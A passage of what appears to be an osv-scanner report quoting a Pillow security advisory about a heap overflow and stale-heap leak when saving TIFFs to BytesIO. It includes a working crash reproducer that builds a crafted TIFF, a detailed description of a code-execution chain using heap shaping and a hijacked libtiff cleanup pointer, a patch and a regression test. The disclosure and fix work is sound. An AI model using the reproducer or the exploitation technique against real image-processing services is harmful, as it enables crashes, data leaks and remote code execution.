Any service that accepts an image and produces a TIFF rendition into a non-file object — the usual pattern for returning or uploading the result without touching disk — is exposed to whoever supplies the image, with no non-default Pillow setting involved. The overflow additionally requires that an attacker-controlled out-of-line tag value reaches libtiff: the uploaded ImageDescription/DocumentName/XMP when the application saves the opened TIFF itself (or copies its tags into the save), or the embedded ICC profile, which survives `convert()`/`resize()`/`thumbnail()`/`copy()` in `im.info` together with the compression. Under those conditions, with a crafted single-band TIFF the uploader gets a heap out-of-bounds write in the worker process of IFD-size bytes (12 bytes per directory entry the upload carries — 126 bytes with the minimal reproducer, 2384 bytes with a 331-entry IFD) immediately past a 128 KiB-class `realloc` block, with the overwritten bytes being the tail of a tag value they chose; on the stock build the minimal reproducer is detected by glibc and kills the process (`SIGABRT`).\n\u003e \n\u003e Given two addresses leaked by a separate bug, this write has been turned into code execution against a stock build of this commit with ASLR/PIE/NX enabled and default settings (that proof-of-concept is not included with this report): a single-process stdlib `http.server` worker doing nothing but `Image.open(BytesIO(body)).save(BytesIO(), \"TIFF\")` per upload executed an attacker-chosen shell command (`id\u003e/tmp/r.XXXXXX`), answered `200` and kept serving (12/12 against a freshly started worker, 2/6 after twenty unrelated uploads; a miss normally leaves the worker running and is retryable). The two addresses (`\u0026system`, `\u0026PyBytes_Type`) were taken from an unrelated information disclosure in the same process; everything else is this bug plus properties of Pillow's TIFF reader used as a heap-shaping script. The 4.7 MB attack TIFF is a 397×165 8-bit PackBits image whose rows re-encode to exactly 65 528 bytes (strip ends at sink offset 65 536), a 63 942-byte XMP packet (tag 700) as the first out-of-line value, and ~500 private IFD entries. Because `TiffImagePlugin` turns every IFD entry into one `bytes` object in IFD order, frees an earlier entry when a later one repeats its tag number, and parses the IFD three times per request (`TiffImagePlugin.py:1258`, `:1271`, and `getexif()` from `load_end()` at `:1331`), those entries drain glibc's free lists, punch exact-size holes for every large allocation the save makes, and arrange that the 128 KiB `realloc` of the sink lands directly below a live 0x540 chunk followed by libtiff's own `TIFF` handle (`malloc(1313)` from `TIFFClientOpen`). The 2384 overflowing bytes rewrite the start of the `TIFF` struct with the command string, a zeroed `tif_dir`, `tif_diroff = 65536`, and `tif_cleanup = system` at +0x3f8; libtiff resumes `TIFFWriteDirectorySec` on the modified handle and calls `(*tif-\u003etif_cleanup)(tif)`. With gdb on `__libc_system` the call arrives as `__libc_system(\"id\u003e/tmp/r.…\") ← libtiff.so.6 ← TIFFFlush ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1056) ← _encode (src/encode.c:139)`. Offsets are per-binary constants (glibc 2.36, CPython 3.12.14, libtiff 4.5.0, this `_imaging.so`), all obtainable from public distribution files.\n\u003e \n\u003e Independently, every compressed TIFF written to such a target that exceeds 64 KiB discloses one byte of stale heap per alignment hole (one per odd-length tag value plus possibly one before the IFD; the count is set by the tags in the uploaded file) at predictable offsets in the returned file — low bandwidth, but it is other requests' freed data. File-path and real-fd targets (`TIFFFdOpen`) are unaffected by either issue. The primitive is the same class and attacker position as the `TiffDecode.c` decode-side heap overflows CVE-2020-35654, CVE-2021-25289 and CVE-2020-10379, but on the encode path and behind the output-to-a-non-file and tag-passthrough preconditions above, with code execution additionally depending on an address leak from another bug.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is a single Python script that uses the installed Pillow, writes its inputs into a temporary directory. It has two parts. Each part compares saving to a file path, which goes through `TIFFFdOpen` and is correct, with the same save into an `io.BytesIO`, which goes through the `_tiffWriteProc` memory sink.\n\u003e \n\u003e **Part 1: heap overflow.** `setup_env()` builds `upload.tif` (131 198 bytes) byte by byte: a mode L, 7×8191 image with `Compression=32773` (PackBits) and a 65 535-character `ImageDescription`. The sizes are picked so that when Pillow re-encodes the pixels, the strip comes to 8 + 8191 × 8 = 65 536 bytes and ends exactly at the sink's initial 64 KiB buffer. libtiff then seeks past the 126-byte IFD and writes the 65 536-byte description at offset 65 662. The sink grows only to 131 072 bytes, so the last 126 bytes of the description are written past the end of the heap block. In a fresh child process, the script runs `Image.open(\"upload.tif\").save(\u003ctarget\u003e, \"TIFF\")` with no options, once with `\"out.tif\"` as the target and once with `io.BytesIO()`. The file save exits with 0. The BytesIO save is killed by SIGABRT, with glibc reporting `malloc(): corrupted top size`.\n\u003e \n\u003e **Part 2: stale heap bytes in the output.** A child started with `MALLOC_PERTURB_=170` (glibc fills fresh allocations with 0x55) saves a seeded-noise 300×300 RGB image with `compression=\"tiff_lzw\"` and four odd-length ASCII tags. It saves once to a file and once to a BytesIO, then prints every offset where the two outputs differ. libtiff skips one pad byte before the IFD and one after each odd-length tag value. The file has 0x00 at those offsets, but the BytesIO output still holds the 0x55 that was in uninitialised `realloc()` memory.\n\u003e \n\u003e Expected output on this tree:\n\u003e \n\u003e ```\n\u003e upload.tif: 131198 bytes\n\u003e save to file path : exit code 0, out.tif = 131210 bytes\n\u003e save to BytesIO   : exit code -6, stderr: 'malloc(): corrupted top size'\n\u003e -\u003e heap overflow crashed the process: True\n\u003e \n\u003e same image, same options, saved to a file path vs. to a BytesIO:\n\u003e   offset 369177: file 0x00   BytesIO 0x55\n\u003e   offset 369417: file 0x00   BytesIO 0x55\n\u003e   offset 369423: file 0x00   BytesIO 0x55\n\u003e   offset 369451: file 0x00   BytesIO 0x55\n\u003e \n\u003e -\u003e BytesIO output contains never-written heap bytes: True\n\u003e \n\u003e BUG\n\u003e ```\n\u003e \n\u003e The last line is `BUG` if either part shows its defect, and `OK` otherwise. With the attached patch applied and rebuilt, the BytesIO save exits with 0, the two outputs are identical, and the script prints `OK`.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e The attached patch makes `_tiffWriteProc` in `src/libImaging/TiffDecode.c` honour sparse-file semantics: it sizes the buffer from the write position, and zeroes what `realloc()` adds (the initial block is already `calloc`'d, so every byte libtiff skips then reads as 0, exactly as through `TIFFFdOpen`). For the non-reallocating case (`flrealloc == 0`), where `loc \u003e size` would also make `to_write` negative, it rejects the write with a `TIFFError`, the same idiom `_tiffReadProc` uses:\n\u003e \n\u003e ```diff\n\u003e -        while (newsize \u003c (size + state-\u003esize)) {\n\u003e +        while (newsize \u003c (size + (tsize_t)state-\u003eloc)) {\n\u003e  …\n\u003e +        memset((UINT8 *)new_data + state-\u003esize, 0, newsize - state-\u003esize);\n\u003e          state-\u003edata = new_data;\n\u003e          state-\u003esize = newsize;\n\u003e          to_write = size;\n\u003e +    } else if (to_write \u003c 0) {\n\u003e +        TIFFError(\"_tiffWriteProc\", \"Invalid Write at loc %\" PRIu64 \", size: %\" PRIu64, …);\n\u003e +        return 0;\n\u003e      }\n\u003e ```\n\u003e \n\u003e `_tiffSeekProc` is left unconstrained, since libtiff legitimately seeks past the end of data; with the write proc fixed, `eof` can no longer exceed `size`, so the read-out in `ImagingLibTiffEncode` (`:1067`, `:1073`) stays within the block. The patch also adds `test_save_bytesio_seek_past_end` to `Tests/test_file_libtiff.py`, which saves the PackBits 64 KiB-boundary case and an LZW case with odd-length tags to both a file and a `BytesIO` and asserts the outputs are identical. With the patch applied and rebuilt, the BytesIO output is byte-identical to the file output, no AddressSanitizer report is produced for tag lengths 65410/65535/131071/196607, the code-execution chain described under Impact no longer runs its command, and the existing TIFF tests pass.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Size the libtiff in-memory write buffer from the write position, not its current size, and zero the space added by realloc in _tiffWriteProc\n\u003e \n\u003e Applies to `src/libImaging/TiffDecode.c` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\n\u003e index 3d804ea4a..d2a926a62 100644\n\u003e --- a/Tests/test_file_libtiff.py\n\u003e +++ b/Tests/test_file_libtiff.py\n\u003e @@ -760,6 +760,38 @@ class TestFileLibTiff(LibTiffTestCase):\n\u003e          save_bytesio(\"packbits\")\n\u003e          save_bytesio(\"tiff_lzw\")\n\u003e  \n\u003e +    def test_save_bytesio_seek_past_end(self, tmp_path: Path) -\u003e None:\n\u003e +        # When writing the directory, libtiff seeks past the end of the data\n\u003e +        # written so far, and then writes the tag values there. Check that the\n\u003e +        # in-memory write buffer grows to fit, and that the bytes that are\n\u003e +        # skipped over are zero, as they would be when writing to a file.\n\u003e +\n\u003e +        # 7 distinct bytes per row: PackBits emits 8 bytes per row, so the strip\n\u003e +        # plus the header are exactly 64 KiB, the initial size of the buffer\n\u003e +        im = Image.new(\"L\", (7, 8191))\n\u003e +        im.putdata([(i * 37) \u0026 0xFF for i in range(7 * 8191)])\n\u003e +        kwargs = {\"compression\": \"packbits\", \"description\": \"D\" * 65535}\n\u003e +\n\u003e +        outfile = tmp_path / \"temp.tif\"\n\u003e +        im.save(outfile, **kwargs)\n\u003e +        buffer_io = io.BytesIO()\n\u003e +        im.save(buffer_io, format=\"tiff\", **kwargs)\n\u003e +        assert buffer_io.getvalue() == outfile.read_bytes()\n\u003e +\n\u003e +        # odd-length tag values, so that libtiff pads between them. Large enough\n\u003e +        # that the buffer has to be reallocated\n\u003e +        im = hopper().resize((300, 300))\n\u003e +        kwargs = {\n\u003e +            \"compression\": \"tiff_lzw\",\n\u003e +            \"description\": \"abcdef\",\n\u003e +            \"software\": \"xyz0\",\n\u003e +            \"tiffinfo\": {315: \"artist\", 33432: \"copyright!\"},\n\u003e +        }\n\u003e +        im.save(outfile, **kwargs)\n\u003e +        buffer_io = io.BytesIO()\n\u003e +        im.save(buffer_io, format=\"tiff\", **kwargs)\n\u003e +        assert buffer_io.getvalue() == outfile.read_bytes()\n\u003e +\n\u003e      def test_save_ycbcr(self, tmp_path: Path) -\u003e None:\n\u003e          im = hopper(\"YCbCr\")\n\u003e          outfile = tmp_path / \"temp.tif\"\n\u003e diff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\n\u003e index 8a57c523d..dd9945493 100644\n\u003e --- a/src/libImaging/TiffDecode.c\n\u003e +++ b/src/libImaging/TiffDecode.c\n\u003e @@ -87,11 +87,13 @@ _tiffWriteProc(thandle_t hdata, tdata_t buf, tsize_t size) {\n\u003e      TRACE((\"_tiffWriteProc: %d \\n\", (int)size));\n\u003e      dump_state(state);\n\u003e  \n\u003e +    // libtiff may have seeked past the end of the buffer, e.g. when writing the\n\u003e +    // directory, so the required size is based on the current location.\n\u003e      to_write = MIN(size, state-\u003esize - (tsize_t)state-\u003eloc);\n\u003e      if (state-\u003eflrealloc \u0026\u0026 size \u003e to_write) {\n\u003e          tdata_t new_data;\n\u003e          tsize_t newsize = state-\u003esize;\n\u003e -        while (newsize \u003c (size + state-\u003esize)) {\n\u003e +        while (newsize \u003c (size + (tsize_t)state-\u003eloc)) {\n\u003e              if (newsize \u003e INT_MAX - 64 * 1024) {\n\u003e                  return 0;\n\u003e              }\n\u003e @@ -105,9 +107,20 @@ _tiffWriteProc(thandle_t hdata, tdata_t buf, tsize_t size) {\n\u003e              // fail out\n\u003e              return 0;\n\u003e          }\n\u003e +        // zero the new space, so that any bytes libtiff seeks over without\n\u003e +        // writing are 0 in the output, as they would be in a file\n\u003e +        memset((UINT8 *)new_data + state-\u003esize, 0, newsize - state-\u003esize);\n\u003e          state-\u003edata = new_data;\n\u003e          state-\u003esize = newsize;\n\u003e          to_write = size;\n\u003e +    } else if (to_write \u003c 0) {\n\u003e +        TIFFError(\n\u003e +            \"_tiffWriteProc\",\n\u003e +            \"Invalid Write at loc %\" PRIu64 \", size: %\" PRIu64,\n\u003e +            state-\u003eloc,\n\u003e +            (toff_t)state-\u003esize\n\u003e +        );\n\u003e +        return 0;\n\u003e      }\n\u003e  \n\u003e      TRACE((\"to_write: %d\\n\", (int)to_write));\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 5,434 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"\n\u003e Pillow: heap overflow + stale heap bytes in the libtiff in-memory write sink\n\u003e (_tiffWriteProc, src/libImaging/TiffDecode.c).\n\u003e \n\u003e im.save(\u003cBytesIO\u003e, \"TIFF\") with any compression goes through libtiff writing\n\u003e into Pillow's memory sink. When libtiff writes the directory it seeks *past*\n\u003e the end of the data written so far and writes tag values there:\n\u003e \n\u003e   1. _tiffWriteProc grows the buffer to `size + write_len` instead of\n\u003e      `loc + write_len`, so that write can run off the end of the allocation.\n\u003e   2. The bytes libtiff skipped over are never written, so whatever the heap\n\u003e      held there ends up in the output file.\n\u003e \n\u003e The same saves to a file path are fine (the kernel zero-fills skipped bytes),\n\u003e which is the control for both parts.\n\u003e \"\"\"\n\u003e import os\n\u003e import resource\n\u003e import struct\n\u003e import subprocess\n\u003e import sys\n\u003e import tempfile\n\u003e \n\u003e resource.setrlimit(resource.RLIMIT_CORE, (0, 0))   # the overflow aborts; no core file\n\u003e os.chdir(tempfile.mkdtemp())\n\u003e \n\u003e \n\u003e def run(code, **env):\n\u003e     \"\"\"Run a Python snippet against the installed Pillow in a fresh process.\"\"\"\n\u003e     return subprocess.run([sys.executable, \"-c\", code], env={**os.environ, **env},\n\u003e                           capture_output=True, text=True)\n\u003e \n\u003e \n\u003e def setup_env():\n\u003e     \"\"\"Write upload.tif: an L-mode 7x8191 PackBits TIFF with a 65535-char ImageDescription.\n\u003e \n\u003e     Sizes are chosen so that, when Pillow re-encodes it:\n\u003e       - the PackBits strip is 8191 rows x 8 bytes + 8-byte header = 65536 bytes,\n\u003e         i.e. the data ends exactly at the sink's initial 64 KiB buffer;\n\u003e       - the first out-of-line tag value (ImageDescription + NUL) is 65536 bytes\n\u003e         and goes at 65536 + 126 (the 10-entry IFD sits in between).\n\u003e     The sink grows to 65536 + 65536 = 131072 bytes, then writes [65662, 131198):\n\u003e     the last 126 bytes of the description land past the end of the heap block.\n\u003e     \"\"\"\n\u003e     w, h = 7, 8191\n\u003e     # 7 distinct bytes per row -\u003e PackBits can only emit one literal run: 1 + 7 bytes\n\u003e     strip = b\"\".join(b\"\\x06\" + bytes((y * 7 + x) * 37 \u0026 0xFF for x in range(w)) for y in range(h))\n\u003e     desc = b\"D\" * 65535 + b\"\\x00\"\n\u003e     strip_off, desc_off = 8, 8 + len(strip)\n\u003e     ifd_off = desc_off + len(desc)\n\u003e     entries = [\n\u003e         (256, 4, 1, w),                  # ImageWidth\n\u003e         (257, 4, 1, h),                  # ImageLength\n\u003e         (258, 3, 1, 8),                  # BitsPerSample\n\u003e         (259, 3, 1, 32773),              # Compression = PackBits (inherited by save())\n\u003e         (262, 3, 1, 1),                  # PhotometricInterpretation = BlackIsZero\n\u003e         (270, 2, len(desc), desc_off),   # ImageDescription (carried into save() via tag_v2)\n\u003e         (273, 4, 1, strip_off),          # StripOffsets\n\u003e         (277, 3, 1, 1),                  # SamplesPerPixel\n\u003e         (278, 4, 1, h),                  # RowsPerStrip\n\u003e         (279, 4, 1, len(strip)),         # StripByteCounts\n\u003e     ]\n\u003e     ifd = struct.pack(\"\u003cH\", len(entries))\n\u003e     ifd += b\"\".join(struct.pack(\"\u003cHHII\", *e) for e in entries)\n\u003e     ifd += struct.pack(\"\u003cI\", 0)\n\u003e     with open(\"upload.tif\", \"wb\") as f:\n\u003e         f.write(struct.pack(\"\u003c2sHI\", b\"II\", 42, ifd_off) + strip + desc + ifd)\n\u003e \n\u003e \n\u003e # ---------------------------------------------------------------------------\n\u003e # Part 1: heap buffer overflow. Re-save an uploaded TIFF with no options.\n\u003e # ---------------------------------------------------------------------------\n\u003e setup_env()\n\u003e print(f\"upload.tif: {os.path.getsize('upload.tif')} bytes\")\n\u003e \n\u003e RESAVE = 'from PIL import Image; import io; Image.open(\"upload.tif\").save({target}, \"TIFF\")'\n\u003e \n\u003e # Control: saving to a file path (real fd, no memory sink) works\n\u003e control = run(RESAVE.format(target='\"out.tif\"'))\n\u003e print(f\"save to file path : exit code {control.returncode}, out.tif = {os.path.getsize('out.tif')} bytes\")\n\u003e \n\u003e # PoC: the identical save into a BytesIO\n\u003e poc = run(RESAVE.format(target=\"io.BytesIO()\"))\n\u003e print(f\"save to BytesIO   : exit code {poc.returncode}, stderr: {poc.stderr.strip()!r}\")\n\u003e \n\u003e # A process killed by a signal (SIGABRT from glibc's heap check) = heap corrupted\n\u003e overflow = control.returncode == 0 and poc.returncode \u003c 0\n\u003e print(f\"-\u003e heap overflow crashed the process: {overflow}\\n\")\n\u003e \n\u003e \n\u003e # ---------------------------------------------------------------------------\n\u003e # Part 2: stale heap bytes in the output. MALLOC_PERTURB_=170 makes glibc fill\n\u003e # fresh allocations with 0x55, so never-written bytes become visible.\n\u003e # ---------------------------------------------------------------------------\n\u003e STALE = r'''\n\u003e import io, random\n\u003e from PIL import Image\n\u003e random.seed(1)\n\u003e im = Image.new(\"RGB\", (300, 300))      # noise -\u003e ~360 KB LZW, so the sink must realloc()\n\u003e im.putdata([tuple(random.randrange(256) for _ in \"rgb\") for _ in range(300 * 300)])\n\u003e # odd-length ASCII tags: libtiff skips one pad byte after each\n\u003e kw = dict(compression=\"tiff_lzw\", description=\"abcdef\", software=\"xyz0\",\n\u003e           tiffinfo={315: \"artist\", 33432: \"copyright!\", 306: \"2024:01:01 00:00:00\"})\n\u003e im.save(\"ref.tif\", \"TIFF\", **kw)\n\u003e buf = io.BytesIO()\n\u003e im.save(buf, \"TIFF\", **kw)\n\u003e a, b = open(\"ref.tif\", \"rb\").read(), buf.getvalue()\n\u003e for i in (i for i in range(len(a)) if a[i] != b[i]):\n\u003e     print(f\"  offset {i}: file 0x{a[i]:02x}   BytesIO 0x{b[i]:02x}\")\n\u003e '''\n\u003e stale = run(STALE, MALLOC_PERTURB_=\"170\").stdout\n\u003e print(\"same image, same options, saved to a file path vs. to a BytesIO:\")\n\u003e print(stale or \"  outputs identical\")\n\u003e leak = \"BytesIO 0x55\" in stale\n\u003e print(f\"-\u003e BytesIO output contains never-written heap bytes: {leak}\\n\")\n\u003e \n\u003e print(\"BUG\" if overflow or leak else \"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-332p-7hrc-92wf | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112393\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
